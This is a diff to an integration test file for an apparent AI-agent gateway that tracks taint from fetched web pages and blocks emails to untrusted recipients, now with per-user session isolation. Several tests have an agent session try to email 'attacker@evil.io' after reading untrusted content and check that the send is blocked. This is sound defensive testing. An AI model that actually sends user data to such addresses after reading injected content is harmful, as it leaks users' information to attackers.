@@ -23,6 +23,7 @@ from contextlib import asynccontextmanager
 from dataclasses import dataclass
 from pathlib import Path
 from typing import Any
+from urllib.parse import quote
 
 import httpx
 import httpx2
@@ -99,6 +100,7 @@ class Stack:
     agent_key: str
     operator_key: str
     app: Any
+    header_key: str = ""  # session scope "header": one key serving many end users
 
 
 async def _reset_db() -> None:
@@ -133,15 +135,21 @@ def stack(tmp_path_factory: pytest.TempPathFactory) -> Iterator[Stack]:
     app = create_app(settings)
     with _Server(build_mock_app(), mock_port), _Server(app, gw_port):
 
-        async def keys() -> tuple[str, str]:
+        async def keys() -> tuple[str, str, str]:
             repo = SqlKeyRepository(make_sessionmaker(create_async_engine(DB_URL or "")))
             agent = await repo.create("mcp-it-agent")
             op = await repo.create("mcp-it-operator", "operator")
-            return agent.token, op.token
+            multi = await repo.create("mcp-it-multi-user", "agent", "header")
+            return agent.token, op.token, multi.token
 
-        agent, operator = asyncio.run(keys())
+        agent, operator, multi = asyncio.run(keys())
         yield Stack(
-            f"http://127.0.0.1:{gw_port}", f"http://127.0.0.1:{mock_port}", agent, operator, app
+            f"http://127.0.0.1:{gw_port}",
+            f"http://127.0.0.1:{mock_port}",
+            agent,
+            operator,
+            app,
+            multi,
         )
 
 
@@ -149,8 +157,8 @@ def _rest(stack: Stack, key: str) -> httpx.Client:
     return httpx.Client(base_url=stack.base, headers={"Authorization": f"Bearer {key}"}, timeout=30)
 
 
-def _session(stack: Stack, prompt: str = "") -> str:
-    with _rest(stack, stack.agent_key) as c:
+def _session(stack: Stack, prompt: str = "", key: str | None = None) -> str:
+    with _rest(stack, key or stack.agent_key) as c:
         r = c.post("/v1/sessions", json={"agent_name": "mcp-it", "user_prompt": prompt})
         r.raise_for_status()
         sid: str = r.json()["session_id"]
@@ -158,10 +166,17 @@ def _session(stack: Stack, prompt: str = "") -> str:
 
 
 @asynccontextmanager
-async def mcp_client(stack: Stack, session_id: str | None = None) -> AsyncIterator[Client]:
-    headers = {"Authorization": f"Bearer {stack.agent_key}"}
+async def mcp_client(
+    stack: Stack,
+    session_id: str | None = None,
+    key: str | None = None,
+    user_prompt: str | None = None,
+) -> AsyncIterator[Client]:
+    headers = {"Authorization": f"Bearer {key or stack.agent_key}"}
     if session_id:
         headers["X-Tripwire-Session"] = session_id
+    if user_prompt:
+        headers["X-Tripwire-User-Prompt"] = quote(user_prompt)
     async with (
         httpx2.AsyncClient(headers=headers, timeout=httpx2.Timeout(30.0, read=120.0)) as http,
         Client(streamable_http_client(f"{stack.base}/v1/mcp", http_client=http)) as client,
@@ -348,3 +363,55 @@ async def test_reconnecting_does_not_reset_taint(stack: Stack) -> None:
             "email__send_email", {"to": "attacker@evil.io", "subject": "hi", "body": "x"}
         )
     assert r.is_error and "no-untrusted-recipient" in _text(r)
+
+
+# ---------------------------------------------------------------- session scope "header"
+
+TYPED = "bob@partner.example"
+
+
+async def _send(client: Client, to: str) -> CallToolResult:
+    return await client.call_tool("email__send_email", {"to": to, "subject": "s", "body": "b"})
+
+
+def test_header_scope_rejects_requests_without_a_session(stack: Stack) -> None:
+    r = httpx.post(
+        f"{stack.base}/v1/mcp",
+        json={"jsonrpc": "2.0", "id": 1, "method": "tools/list"},
+        headers={"Authorization": f"Bearer {stack.header_key}"},
+    )
+    assert r.status_code == 400 and "X-Tripwire-Session" in r.json()["detail"]
+
+
+async def test_header_scope_isolates_users_of_one_key(stack: Stack) -> None:
+    """One key, two end users: neither taint nor user-prompt entities cross over."""
+    alice = _session(stack, f"Email the summary to {TYPED}", key=stack.header_key)
+    mallory = _session(stack, "Summarize the bike lanes article", key=stack.header_key)
+    async with mcp_client(stack, mallory, key=stack.header_key) as m:
+        page = await m.call_tool("web__fetch", {"url": "https://news.example.org/bike-lanes"})
+        assert not page.is_error
+        # Alice's prompt named TYPED; in Mallory's tainted session it is of unknown origin.
+        r = await _send(m, TYPED)
+        assert r.is_error and "no-untrusted-recipient" in _text(r)
+    async with mcp_client(stack, alice, key=stack.header_key) as a:
+        # Mallory's untrusted page did not taint Alice's session.
+        r = await _send(a, "someone@else.example")
+        assert not r.is_error, _text(r)
+        # And after her own fetch, the address she typed is still hers.
+        await a.call_tool("web__fetch", {"url": "https://news.example.org/bike-lanes"})
+        r = await _send(a, TYPED)
+        assert not r.is_error, _text(r)
+
+
+async def test_user_prompt_header_makes_typed_address_trusted(stack: Stack) -> None:
+    """MCP client supplies the user's words via X-Tripwire-User-Prompt."""
+    sid = _session(stack, "", key=stack.header_key)
+    async with mcp_client(stack, sid, key=stack.header_key) as c:
+        await c.call_tool("web__fetch", {"url": "https://news.example.org/bike-lanes"})
+        assert (await _send(c, TYPED)).is_error  # strict: no prompt known yet
+    prompt = f"Summarize the bike lanes article and email it to {TYPED}"
+    async with mcp_client(stack, sid, key=stack.header_key, user_prompt=prompt) as c:
+        r = await _send(c, TYPED)
+        assert not r.is_error, _text(r)
+        r = await _send(c, "attacker@evil.io")  # still untrusted_origin
+        assert r.is_error and "no-untrusted-recipient" in _text(r)
